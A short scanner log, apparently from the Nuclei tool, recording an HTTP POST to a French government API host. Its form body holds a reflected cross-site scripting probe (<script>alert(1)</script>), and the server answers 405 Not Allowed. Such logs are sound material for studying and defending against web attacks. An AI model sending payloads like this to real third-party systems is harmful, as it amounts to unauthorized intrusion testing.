Host: datapass.api.gouv.fr
User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)
Connection: close
Content-Length: 27
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

_=<script>alert(1)</script>
response:
HTTP/1.1 405 Not Allowed Connection: close Content-Length: 166 Content-Type: text/html Date: Sun, 25 Sep 2022 04:59:20 GMT Server: nginx/1.18.0 (Ubuntu) 405 Not Allowed
